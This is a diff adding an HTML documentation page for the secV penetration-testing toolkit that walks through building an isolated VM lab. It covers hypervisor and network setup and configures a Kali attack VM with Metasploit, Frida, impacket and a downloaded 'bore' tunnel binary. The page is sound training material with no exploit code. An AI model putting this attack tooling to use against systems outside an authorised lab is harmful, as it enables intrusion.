@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab Setup — Build Your VM Lab From Zero — secV Docs</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;-webkit-font-smoothing:antialiased;}
+:root{
+  --bg:#050505;--bg1:#0d0d0d;--bg2:#141414;--bg3:#1c1c1c;
+  --border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.13);--border3:rgba(255,255,255,0.2);
+  --text:#a8a8a8;--muted:#505050;--dim:#252525;
+  --white:#f0f0f0;--off:#d8d8d8;--grey:#787878;
+  --green:#4ade80;--amber:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--red:#f87171;--orange:#fb923c;
+  --mono:'JetBrains Mono',monospace;--disp:'Syne',sans-serif;
+  --nav-h:52px;--transition:0.16s ease;
+}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.7;overflow-x:hidden;}
+::-webkit-scrollbar{width:4px;height:4px;}::-webkit-scrollbar-track{background:var(--bg);}::-webkit-scrollbar-thumb{background:var(--bg3);border-radius:2px;}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:var(--nav-h);display:flex;align-items:center;justify-content:space-between;padding:0 2.5rem;border-bottom:1px solid transparent;transition:border-color 0.3s,background 0.3s;}
+nav.scrolled{background:rgba(5,5,5,0.96);backdrop-filter:blur(16px);border-color:var(--border);}
+.logo{font-family:var(--disp);font-size:0.9rem;font-weight:700;color:var(--off);text-decoration:none;letter-spacing:0.01em;display:flex;align-items:center;gap:0.55rem;}
+.logo-mark{width:6px;height:6px;background:var(--white);flex-shrink:0;}
+.nav-links{display:flex;align-items:center;gap:0.1rem;}
+.nav-link{font-family:var(--mono);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);text-decoration:none;padding:0.4rem 0.75rem;transition:color var(--transition);}
+.nav-link:hover,.nav-link.active{color:var(--white);}
+.nav-btn{font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;text-decoration:none;padding:0.4rem 0.9rem;border:1px solid var(--border2);margin-left:0.5rem;transition:border-color var(--transition),color var(--transition);color:var(--text);}
+.nav-btn:hover{border-color:var(--white);color:var(--white);}
+.nav-btn.primary{background:var(--white);border-color:var(--white);color:var(--bg);}
+.nav-btn.primary:hover{background:transparent;color:var(--white);}
+.nav-burger{display:none;background:none;border:1px solid var(--border2);padding:0.4rem 0.6rem;cursor:pointer;border-radius:3px;flex-direction:column;gap:4px;}
+.nav-burger span{display:block;width:18px;height:1px;background:var(--text);transition:transform var(--transition),opacity var(--transition);}
+body.nav-open .nav-burger span:nth-child(1){transform:rotate(45deg) translate(3.5px,3.5px);}
+body.nav-open .nav-burger span:nth-child(2){opacity:0;}
+body.nav-open .nav-burger span:nth-child(3){transform:rotate(-45deg) translate(3.5px,-3.5px);}
+
+.page-layout{display:grid;grid-template-columns:220px 1fr 180px;gap:0;max-width:1380px;margin:0 auto;min-height:100vh;}
+aside.left-nav{position:fixed;top:var(--nav-h);bottom:0;width:220px;overflow-y:auto;border-right:1px solid var(--border);padding:2rem 1.25rem 3rem;background:var(--bg);}
+.chapter-nav{list-style:none;}
+.chapter-nav li{margin-bottom:0.05rem;}
+.chapter-nav a{display:block;font-size:0.6rem;letter-spacing:0.06em;text-transform:uppercase;color:var(--muted);text-decoration:none;padding:0.35rem 0.65rem;border-left:2px solid transparent;transition:color var(--transition),border-color var(--transition);}
+.chapter-nav a:hover{color:var(--text);border-color:var(--border2);}
+.chapter-nav a.active{color:var(--white);border-color:var(--white);}
+.chap-sep{font-size:0.44rem;letter-spacing:0.22em;text-transform:uppercase;color:var(--dim);padding:0.9rem 0 0.3rem 0.65rem;margin-top:0.5rem;}
+
+.main-content{grid-column:2;margin-left:220px;margin-right:180px;padding:calc(var(--nav-h) + 3rem) 3.5rem 5rem;}
+
+.page-toc{position:fixed;top:var(--nav-h);right:0;width:180px;overflow-y:auto;padding:2rem 1rem 3rem 1.25rem;border-left:1px solid var(--border);}
+.toc-label{font-size:0.44rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--dim);padding-bottom:0.5rem;margin-bottom:0.5rem;border-bottom:1px solid var(--border);}
+.toc-list{list-style:none;}
+.toc-list a{display:block;font-size:0.57rem;color:var(--muted);text-decoration:none;padding:0.22rem 0;transition:color var(--transition);}
+.toc-list a:hover{color:var(--text);}
+.toc-list a.active{color:var(--green);}
+
+.chapter{padding-bottom:5rem;border-bottom:1px solid var(--border);margin-bottom:5rem;}
+.chapter:last-child{border-bottom:none;}
+.ch-label{font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);margin-bottom:0.6rem;display:flex;align-items:center;gap:0.7rem;}
+.ch-num{font-family:var(--disp);font-size:2rem;font-weight:800;color:var(--dim);line-height:1;}
+.ch-title{font-family:var(--disp);font-size:clamp(1.6rem,3vw,2.4rem);font-weight:800;letter-spacing:-0.03em;color:var(--white);margin-bottom:1.5rem;line-height:1.05;}
+.ch-title em{color:var(--green);font-style:normal;}
+.ch-sub{font-size:0.9rem;color:var(--muted);line-height:1.9;max-width:620px;margin-bottom:2rem;}
+
+h3{font-family:var(--disp);font-size:1.1rem;font-weight:700;color:var(--off);margin:2.5rem 0 0.9rem;letter-spacing:-0.01em;}
+h4{font-family:var(--mono);font-size:0.8rem;font-weight:600;color:var(--grey);letter-spacing:0.06em;text-transform:uppercase;margin:1.8rem 0 0.6rem;}
+p{font-size:0.82rem;color:var(--text);line-height:1.85;margin-bottom:1rem;}
+p:last-child{margin-bottom:0;}
+a{color:var(--grey);transition:color var(--transition);}
+a:hover{color:var(--white);}
+ul,ol{font-size:0.82rem;color:var(--text);line-height:1.85;margin:0.5rem 0 1rem 1.5rem;}
+li{margin-bottom:0.3rem;}
+strong{color:var(--off);}
+code{font-family:var(--mono);font-size:0.75rem;background:var(--bg1);border:1px solid var(--border2);padding:0.08rem 0.38rem;color:var(--off);border-radius:2px;}
+pre{background:var(--bg1);border:1px solid var(--border);border-left:3px solid var(--border3);padding:1.2rem 1.5rem;overflow-x:auto;margin:1.2rem 0;font-size:0.74rem;line-height:1.8;border-radius:0 3px 3px 0;}
+pre code{background:none;border:none;padding:0;font-size:inherit;}
+.cm{color:var(--muted);font-style:italic;}
+.kw{color:var(--white);}
+.str{color:var(--grey);}
+.hl{color:var(--green);}
+
+.table-wrap{overflow-x:auto;margin:1rem 0;}
+table{width:100%;border-collapse:collapse;font-size:0.74rem;min-width:420px;}
+th{font-size:0.52rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--grey);text-align:left;padding:0.6rem 1rem;border-bottom:1px solid var(--border2);background:var(--bg1);}
+td{padding:0.7rem 1rem;border-bottom:1px solid var(--border);color:var(--text);vertical-align:top;line-height:1.65;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--bg1);}
+td:first-child{color:var(--off);font-weight:500;}
+td code{font-size:0.69rem;}
+
+.callout{display:flex;gap:0.8rem;padding:1rem 1.25rem;border:1px solid var(--border2);border-left:3px solid var(--border2);margin:1.5rem 0;font-size:0.78rem;line-height:1.75;color:var(--text);border-radius:0 3px 3px 0;}
+.callout.warn{border-left-color:var(--amber);}
+.callout.tip{border-left-color:var(--green);}
+.callout.crit{border-left-color:var(--red);background:rgba(248,113,113,0.04);}
+.callout-mark{font-size:0.7rem;color:var(--grey);flex-shrink:0;margin-top:0.1rem;}
+.callout.warn .callout-mark{color:var(--amber);}
+.callout.tip .callout-mark{color:var(--green);}
+.callout.crit .callout-mark{color:var(--red);}
+
+.step-list{counter-reset:steps;list-style:none;margin:1rem 0;}
+.step-list>li{counter-increment:steps;display:grid;grid-template-columns:2.5rem 1fr;gap:0.8rem;margin-bottom:1.2rem;align-items:start;}
+.step-list>li::before{content:counter(steps,'decimal-leading-zero');font-family:var(--disp);font-size:0.8rem;font-weight:800;color:var(--muted);padding-top:0.1rem;}
+
+.byte-diagram{background:var(--bg1);border:1px solid var(--border);margin:1.2rem 0;overflow-x:auto;}
+.byte-row{display:flex;border-bottom:1px solid var(--border);font-size:0.66rem;}
+.byte-row:last-child{border-bottom:none;}
+.byte-offset{background:var(--bg2);color:var(--muted);padding:0.5rem 0.85rem;font-family:var(--mono);min-width:5rem;border-right:1px solid var(--border);flex-shrink:0;}
+.byte-hex{color:var(--blue);padding:0.5rem 1rem;font-family:var(--mono);letter-spacing:0.08em;border-right:1px solid var(--border);flex:1;}
+.byte-desc{color:var(--text);padding:0.5rem 1rem;flex:2;}
+
+.arch-box{background:var(--bg1);border:1px solid var(--border);padding:1.5rem;margin:1.2rem 0;font-size:0.74rem;font-family:var(--mono);line-height:1.9;overflow-x:auto;white-space:pre;}
+.net-row{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);margin:1.2rem 0;}
+.net-cell{background:var(--bg);padding:0.9rem 1rem;font-size:0.7rem;}
+.net-cell-head{font-size:0.5rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);margin-bottom:0.4rem;}
+.net-cell-val{color:var(--white);font-weight:600;}
+.net-cell-sub{color:var(--muted);font-size:0.62rem;margin-top:0.2rem;}
+
+.tag-chip{display:inline-block;font-size:0.5rem;letter-spacing:0.1em;text-transform:uppercase;padding:0.12rem 0.5rem;border:1px solid var(--border2);color:var(--muted);margin:0.1rem;}
+.tag-chip.g{border-color:rgba(74,222,128,0.3);color:var(--green);}
+.tag-chip.a{border-color:rgba(251,191,36,0.3);color:var(--amber);}
+.tag-chip.r{border-color:rgba(248,113,113,0.3);color:var(--red);}
+.tag-chip.b{border-color:rgba(96,165,250,0.3);color:var(--blue);}
+
+.vm-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);margin:1.2rem 0;}
+.vm-card{background:var(--bg);padding:1.2rem;transition:background var(--transition);}
+.vm-card:hover{background:var(--bg1);}
+.vm-card-icon{font-size:0.5rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);margin-bottom:0.5rem;}
+.vm-card-name{font-family:var(--disp);font-size:0.95rem;font-weight:700;color:var(--white);margin-bottom:0.35rem;}
+.vm-card-desc{font-size:0.7rem;color:var(--muted);line-height:1.6;}
+
+.chain-row{display:flex;align-items:stretch;gap:0;margin:1.5rem 0;overflow-x:auto;}
+.chain-step{flex:1;min-width:120px;background:var(--bg1);border:1px solid var(--border);padding:1rem;border-right:none;position:relative;}
+.chain-step:last-child{border-right:1px solid var(--border);}
+.chain-arrow{display:flex;align-items:center;padding:0 0.5rem;color:var(--muted);font-size:0.9rem;flex-shrink:0;}
+.chain-num{font-family:var(--disp);font-size:0.6rem;font-weight:800;color:var(--muted);margin-bottom:0.3rem;}
+.chain-title{font-size:0.68rem;font-weight:600;color:var(--white);margin-bottom:0.25rem;}
+.chain-body{font-size:0.6rem;color:var(--muted);line-height:1.55;}
+
+footer{border-top:1px solid var(--border);margin-top:2rem;}
+.foot-inner{max-width:1380px;margin:0 auto;padding:1.5rem 2.5rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;}
+.foot-brand{font-family:var(--disp);font-size:0.88rem;font-weight:700;color:var(--muted);text-decoration:none;}
+.foot-links{display:flex;gap:1.75rem;}
+.foot-link{font-size:0.55rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);text-decoration:none;transition:color var(--transition);}
+.foot-link:hover{color:var(--text);}
+
+@media(max-width:1100px){
+  .page-layout{grid-template-columns:1fr;}
+  aside.left-nav{display:none;}
+  .page-toc{display:none;}
+  .main-content{margin:0;padding:calc(var(--nav-h)+2rem) 1.5rem 4rem;}
+  nav{padding:0 1.5rem;}
+  .nav-links{display:none;}
+  .nav-burger{display:flex;}
+  body.nav-open .nav-links{display:flex;position:fixed;top:var(--nav-h);left:0;right:0;background:var(--bg);border-bottom:1px solid var(--border);flex-direction:column;padding:1rem 1.5rem 1.5rem;gap:0.25rem;align-items:flex-start;z-index:99;}
+}
+</style>
+</head>
+<body>
+
+<nav id="nav">
+  <a class="logo" href="index.html">
+    <span class="logo-mark"></span>SecVulnHub
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="index.html">Docs Home</a>
+    <a class="nav-link" href="foundations.html">Foundations</a>
+    <a class="nav-link active" href="lab-setup.html">Lab Setup</a>
+    <a class="nav-link" href="modules/android_pentest.html">Android</a>
+    <a class="nav-btn" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+    <a class="nav-btn primary" href="https://discord.gg/SecVulnHub" target="_blank">Discord</a>
+  </div>
+  <button class="nav-burger" id="burger" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+</nav>
+
+<div class="page-layout">
+
+<!-- LEFT CHAPTER NAV -->
+<aside class="left-nav">
+  <div class="chap-sep">Lab Setup</div>
+  <ul class="chapter-nav">
+    <li><a href="#why-lab">Why a VM Lab?</a></li>
+    <li><a href="#host-requirements">Host Requirements</a></li>
+    <li><div class="chap-sep">Hypervisor</div></li>
+    <li><a href="#vbox">VirtualBox (Windows/macOS)</a></li>
+    <li><a href="#kvm">QEMU/KVM (Linux)</a></li>
+    <li><div class="chap-sep">Virtual Machines</div></li>
+    <li><a href="#kali-vm">Kali Linux (Attack Box)</a></li>
+    <li><a href="#target-vms">Target VMs</a></li>
+    <li><a href="#android-target">Android Target</a></li>
+    <li><div class="chap-sep">Networking</div></li>
+    <li><a href="#lab-network">Lab Network Design</a></li>
+    <li><a href="#network-modes">Network Modes Explained</a></li>
+    <li><div class="chap-sep">secV Setup</div></li>
+    <li><a href="#install-secv">Install secV</a></li>
+    <li><a href="#health-check">Health Check</a></li>
+    <li><a href="#first-attack">First Lab Attack</a></li>
+  </ul>
+</aside>
+
+<!-- MAIN CONTENT -->
+<main class="main-content">
+
+  <!-- INTRO HEADER -->
+  <div style="padding-bottom:3rem;border-bottom:1px solid var(--border);margin-bottom:4rem;">
+    <div style="font-size:0.52rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);margin-bottom:1rem;">
+      <a href="index.html" style="color:var(--muted);text-decoration:none">SecVulnHub</a> / <a href="foundations.html" style="color:var(--muted);text-decoration:none">Foundations</a> / Lab Setup
+    </div>
+    <h1 style="font-family:var(--disp);font-size:clamp(2.5rem,5vw,4.5rem);font-weight:800;letter-spacing:-0.04em;color:var(--white);line-height:0.95;margin-bottom:1rem;">Building Your <em style="color:var(--green);font-style:normal;">VM Lab</em><br>From Zero</h1>
+    <p style="font-size:0.92rem;color:var(--muted);max-width:600px;line-height:1.85;margin-bottom:1.5rem;">A complete guide to setting up a safe, isolated virtual machine lab environment. Covers hypervisor installation, Kali Linux setup, target VMs, network design, and first use — from an empty machine to a fully operational penetration testing lab.</p>
+    <div style="display:flex;gap:0.5rem;flex-wrap:wrap;">
+      <span class="tag-chip g">Beginner Friendly</span>
+      <span class="tag-chip a">Linux/macOS/Windows</span>
+      <span class="tag-chip b">VirtualBox + QEMU/KVM</span>
+      <span class="tag-chip">~2 hours to complete</span>
+    </div>
+  </div>
+
+  <!-- CHAPTER 1: WHY A VM LAB -->
+  <div class="chapter" id="why-lab">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">01</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Foundation</span>
+    </div>
+    <h2 class="ch-title">Why You Need a <em>Virtual Machine Lab</em></h2>
+    <p class="ch-sub">You cannot safely learn penetration testing on production systems. A VM lab gives you a completely isolated environment where you can run tools, break things, restart, and try again — with zero risk to real systems.</p>
+
+    <h3>What "virtual machine" means</h3>
+    <p>A <strong>virtual machine (VM)</strong> is a software-emulated computer that runs inside your physical computer. It has its own virtual CPU, RAM, disk, and network adapters — but they're all simulated. The software that creates and manages VMs is called a <strong>hypervisor</strong>.</p>
+    <p>From inside the VM, it feels like a real computer. It boots an operating system, runs programs, has a file system. But it's isolated — what happens inside the VM stays inside the VM. You can delete and recreate it instantly. You can take <strong>snapshots</strong> (saves of the full VM state) and restore to any point in seconds.</p>
+
+    <div class="callout tip">
+      <span class="callout-mark">▶</span>
+      <span><strong>The key rule:</strong> Always run attack tools inside a VM, never on your host machine. If a tool misbehaves, malfunctions, or accidentally scans the wrong target, you simply delete the VM. Your host is untouched.</span>
+    </div>
+
+    <h3>Lab topology overview</h3>
+    <p>A minimal secV lab has two VMs:</p>
+    <div class="vm-grid">
+      <div class="vm-card">
+        <div class="vm-card-icon">Attack Box</div>
+        <div class="vm-card-name">Kali Linux</div>
+        <div class="vm-card-desc">Where you run secV, Metasploit, ADB, apktool, and all attack tools. This is your attacker machine. 4 GB RAM minimum, 8 GB recommended. 50 GB disk.</div>
+      </div>
+      <div class="vm-card">
+        <div class="vm-card-icon">Target (Linux)</div>
+        <div class="vm-card-name">Metasploitable 3</div>
+        <div class="vm-card-desc">Intentionally vulnerable Linux server for practicing exploits, privilege escalation, and post-exploitation. Pre-configured with dozens of vulnerabilities. Download from Rapid7.</div>
+      </div>
+      <div class="vm-card">
+        <div class="vm-card-icon">Target (Android)</div>
+        <div class="vm-card-name">Android Emulator</div>
+        <div class="vm-card-desc">Android x86 VM or Android Studio AVD for testing android_pentest operations. Use a stock non-Google-Play-Protect-enrolled build for easiest ADB access.</div>
+      </div>
+      <div class="vm-card">
+        <div class="vm-card-icon">Optional</div>
+        <div class="vm-card-name">Windows Server 2019</div>
+        <div class="vm-card-desc">For testing adsec and winadsec AD modules. Set up a domain controller. Microsoft provides free 180-day evaluation ISOs.</div>
+      </div>
+    </div>
+    <p>All VMs share a <strong>host-only network</strong> — they can see each other but are completely cut off from your real LAN and the internet. This means even if you accidentally run a DoS attack or an exploit against a production server, your traffic never leaves the lab.</p>
+  </div>
+
+  <!-- CHAPTER 2: HOST REQUIREMENTS -->
+  <div class="chapter" id="host-requirements">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">02</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Setup</span>
+    </div>
+    <h2 class="ch-title">Host Machine <em>Requirements</em></h2>
+    <p class="ch-sub">Your physical computer (the host) runs the hypervisor, which runs the VMs. The host needs enough resources to run 2–3 VMs simultaneously.</p>
+
+    <div class="table-wrap"><table>
+      <thead><tr><th>Component</th><th>Minimum</th><th>Recommended</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td>CPU</td><td>4 cores, x86_64</td><td>8+ cores</td><td>Must support hardware virtualization: Intel VT-x or AMD-V. Check BIOS — enabled by default on most post-2015 CPUs.</td></tr>
+        <tr><td>RAM</td><td>8 GB</td><td>16–32 GB</td><td>Kali (4 GB) + Metasploitable (1–2 GB) + Android (2–3 GB) = 7–9 GB. Host OS needs ~4 GB. 16 GB is the comfortable minimum.</td></tr>
+        <tr><td>Disk</td><td>100 GB free</td><td>200–500 GB SSD</td><td>Each VM uses 20–80 GB. Snapshots multiply storage. Use an SSD — HDD makes VMs painful to use.</td></tr>
+        <tr><td>OS</td><td>Windows 10, Ubuntu 20.04, macOS 12</td><td>Any modern 64-bit OS</td><td>For VirtualBox: Windows/macOS/Linux all work. For QEMU/KVM: Linux host required (best performance).</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>Check hardware virtualization in BIOS</h3>
+    <p>Before installing a hypervisor, confirm your CPU's virtualization extensions are enabled:</p>
+    <pre><code><span class="cm"># Linux — check if VT-x or AMD-V is enabled</span>
+grep -E 'vmx|svm' /proc/cpuinfo | head -3
+<span class="cm"># If output shows 'vmx' (Intel) or 'svm' (AMD) → virtualization is enabled</span>
+
+<span class="cm"># Windows — check in Task Manager → Performance → CPU → Virtualization</span>
+<span class="cm"># Or run in PowerShell:</span>
+(Get-WmiObject Win32_ComputerSystem).HypervisorPresent</code></pre>
+
+    <p>If virtualization is disabled, reboot into BIOS/UEFI (usually F2, F10, Del, or Esc during boot) and enable <strong>Intel Virtualization Technology (VT-x)</strong> or <strong>AMD-V</strong>. Also enable <strong>VT-d</strong> (Intel) or <strong>AMD-Vi/IOMMU</strong> for USB passthrough (needed for ADB over USB to work inside a VM).</p>
+  </div>
+
+  <!-- CHAPTER 3: VIRTUALBOX -->
+  <div class="chapter" id="vbox">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">03</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Hypervisor</span>
+    </div>
+    <h2 class="ch-title">VirtualBox — <em>Windows &amp; macOS</em></h2>
+    <p class="ch-sub">VirtualBox is the recommended hypervisor for Windows and macOS hosts. It's free, open-source, and easy to use. If you're on Linux, jump to the QEMU/KVM chapter instead — KVM gives dramatically better performance on Linux hosts.</p>
+
+    <h3>Install VirtualBox</h3>
+    <ol class="step-list">
+      <li>
+        <div>Download the latest VirtualBox installer for your host OS from <code>virtualbox.org/wiki/Downloads</code>. Also download the <strong>VirtualBox Extension Pack</strong> (same page) — it enables USB 3.0 support needed for ADB passthrough.</div>
+      </li>
+      <li>
+        <div>Run the installer. Accept defaults. On Windows, it will temporarily disconnect your network adapter to install the virtual network drivers — this is normal. On macOS, approve the system extension in System Preferences → Security.</div>
+      </li>
+      <li>
+        <div>Launch VirtualBox. Install the Extension Pack: <code>File → Preferences → Extensions → Add Extension Pack</code>, select the downloaded <code>.vbox-extpack</code> file, and accept the license.</div>
+      </li>
+      <li>
+        <div>Add yourself to the <code>vboxusers</code> group (Linux only) so VMs can access USB:
+          <pre><code>sudo usermod -aG vboxusers $USER
+<span class="cm"># Log out and back in for this to take effect</span></code></pre>
+        </div>
+      </li>
+    </ol>
+
+    <div class="callout tip">
+      <span class="callout-mark">▶</span>
+      <span>VirtualBox 7.x is the current release (2025). Always install the matching Extension Pack version — mismatched versions cause USB passthrough failures.</span>
+    </div>
+
+    <h3>Create the host-only network</h3>
+    <p>Before creating any VMs, create a host-only network adapter. All your lab VMs will connect to this — it's your lab LAN:</p>
+    <pre><code><span class="cm"># File → Host Network Manager → Create</span>
+<span class="cm"># Set IPv4 Address: 192.168.56.1</span>
+<span class="cm"># Set IPv4 Network Mask: 255.255.255.0</span>
+<span class="cm"># Enable DHCP Server, Server Address: 192.168.56.100</span>
+<span class="cm"># Lower Address Bound: 192.168.56.101</span>
+<span class="cm"># Upper Address Bound: 192.168.56.254</span>
+
+<span class="cm"># VMs with Host-Only adapter will get 192.168.56.x addresses</span>
+<span class="cm"># Host can always reach 192.168.56.1 from any guest</span></code></pre>
+  </div>
+
+  <!-- CHAPTER 4: KVM -->
+  <div class="chapter" id="kvm">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">04</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Hypervisor</span>
+    </div>
+    <h2 class="ch-title">QEMU/KVM — <em>Linux (Best Performance)</em></h2>
+    <p class="ch-sub">QEMU with KVM (Kernel-based Virtual Machine) is the Linux-native hypervisor. Because KVM runs inside the kernel, there's almost no overhead — VMs run at near-native CPU speed. This is what the secV developers use. If your host is Linux, use KVM.</p>
+
+    <h3>Install QEMU/KVM and virt-manager</h3>
+    <pre><code><span class="cm"># Arch / CachyOS / Manjaro</span>
+sudo pacman -S qemu-full virt-manager virt-viewer libvirt dnsmasq bridge-utils ovmf
+
+<span class="cm"># Ubuntu / Debian / Kali</span>
+sudo apt update && sudo apt install -y \
+  qemu-kvm qemu-utils libvirt-daemon-system libvirt-clients \
+  virt-manager bridge-utils ovmf
+
+<span class="cm"># Fedora</span>
+sudo dnf install -y @virtualization virt-manager</code></pre>
+
+    <h3>Enable and start libvirtd</h3>
+    <pre><code>sudo systemctl enable --now libvirtd
+sudo usermod -aG libvirt,kvm $USER
+<span class="cm"># Log out and back in after adding groups</span>
+
+<span class="cm"># Verify KVM is accessible</span>
+kvm-ok          <span class="cm"># shows "KVM acceleration can be used" if enabled</span>
+ls /dev/kvm     <span class="cm"># must exist</span></code></pre>
+
+    <h3>Create the lab network</h3>
+    <pre><code><span class="cm"># Create an isolated host-only network (no internet access)</span>
+cat > /tmp/lab-net.xml << 'EOF'
+&lt;network&gt;
+  &lt;name&gt;lab-isolated&lt;/name&gt;
+  &lt;bridge name="virbr-lab" stp="on" delay="0"/&gt;
+  &lt;ip address="192.168.100.1" netmask="255.255.255.0"&gt;
+    &lt;dhcp&gt;
+      &lt;range start="192.168.100.100" end="192.168.100.254"/&gt;
+    &lt;/dhcp&gt;
+  &lt;/ip&gt;
+&lt;/network&gt;
+EOF
+
+sudo virsh net-define /tmp/lab-net.xml
+sudo virsh net-start lab-isolated
+sudo virsh net-autostart lab-isolated
+
+<span class="cm"># Verify</span>
+sudo virsh net-list --all
+<span class="cm"># Name          State   Autostart  Persistent</span>
+<span class="cm"># lab-isolated  active  yes        yes</span></code></pre>
+
+    <div class="callout tip">
+      <span class="callout-mark">▶</span>
+      <span><strong>virt-manager</strong> is the GUI frontend for KVM — use it to create and manage VMs graphically. You can also use the CLI (<code>virt-install</code>) for scripted VM creation.</span>
+    </div>
+  </div>
+
+  <!-- CHAPTER 5: KALI VM -->
+  <div class="chapter" id="kali-vm">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">05</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Attack Box</span>
+    </div>
+    <h2 class="ch-title">Kali Linux VM — <em>Your Attack Machine</em></h2>
+    <p class="ch-sub">Kali Linux is the standard attack OS — it ships with 600+ security tools pre-installed. This is where secV lives. You'll run every operation from this VM.</p>
+
+    <h3>Download Kali Linux</h3>
+    <p>Get the VM pre-built image from <code>kali.org/get-kali/#kali-virtual-machines</code> — this saves you the OS installation step. Two formats available:</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Format</th><th>Use with</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td>VirtualBox OVA</td><td>VirtualBox</td><td>Import directly: File → Import Appliance → select .ova. Fastest setup.</td></tr>
+        <tr><td>VMware OVA</td><td>VMware Workstation/Fusion</td><td>Works on VMware. Converted images also work on VirtualBox after format change.</td></tr>
+        <tr><td>QCOW2</td><td>QEMU/KVM</td><td>Native KVM format. Fastest with KVM. Import via virt-manager (create new → import existing disk).</td></tr>
+        <tr><td>ISO</td><td>Any hypervisor</td><td>Full installer — choose if you want control over partitioning and packages. ~3.5 GB.</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>VM settings — minimum configuration</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>Setting</th><th>Value</th><th>Why</th></tr></thead>
+      <tbody>
+        <tr><td>RAM</td><td>4 GB (min), 8 GB (recommended)</td><td>Metasploit uses ~1 GB at rest. Frida + ADB + browser = another 1–2 GB.</td></tr>
+        <tr><td>CPUs</td><td>4 vCPUs</td><td>msfvenom payload generation uses all cores. apktool rebuilds are CPU-bound.</td></tr>
+        <tr><td>Disk</td><td>60 GB dynamic</td><td>APK builds, MSF modules, scan logs, snapshots. Dynamic means only used space is consumed on host disk.</td></tr>
+        <tr><td>Network 1</td><td>Host-only (lab-isolated)</td><td>Primary LAN for reaching target VMs.</td></tr>
+        <tr><td>Network 2</td><td>NAT</td><td>Outbound internet access for downloads (apt update, pip install, bore tunnel). Inbound blocked by NAT — safe.</td></tr>
+        <tr><td>USB</td><td>USB 3.0 controller enabled</td><td>Required for Android device passthrough (ADB over USB).</td></tr>
+      </tbody>
+    </table></div>
+
+    <h3>First boot — change default credentials</h3>
+    <pre><code><span class="cm"># Default Kali credentials: kali/kali</span>
+<span class="cm"># Change immediately after first login</span>
+passwd
+
+<span class="cm"># Enable SSH for terminal access from host</span>
+sudo systemctl enable --now ssh
+sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+sudo systemctl restart ssh
+
+<span class="cm"># Get the VM's IP (connect from host: ssh kali@192.168.100.x)</span>
+ip a show eth0 | grep inet</code></pre>
+
+    <h3>Update and install essentials</h3>
+    <pre><code>sudo apt update && sudo apt full-upgrade -y
+
+<span class="cm"># Core tools (most pre-installed on Kali)</span>
+sudo apt install -y \
+  git golang python3-pip adb apktool \
+  metasploit-framework jadx nodejs npm \
+  qrencode socat ncat libimobiledevice-utils
+
+<span class="cm"># Python libraries for secV</span>
+pip3 install requests beautifulsoup4 frida-tools impacket \
+             ldap3 paramiko scapy psutil netifaces
+
+<span class="cm"># bore tunnel (required for WAN mode)</span>
+curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
+  | tar xz && sudo mv bore /usr/local/bin/bore
+bore --version    <span class="cm"># should print version</span>
+
+<span class="cm"># Metasploit database init (one time)</span>
+sudo msfdb init</code></pre>
+  </div>
+
+  <!-- CHAPTER 6: TARGET VMs -->
+  <div class="chapter" id="target-vms">
+    <div style="display:flex;align-items:baseline;gap:1rem;margin-bottom:0.6rem;">
+      <span class="ch-num">06</span>
+      <span style="font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;color:var(--muted);">Targets</span>
+    </div>
+    <h2 class="ch-title">Target VMs — <em>Intentionally Vulnerable</em></h2>
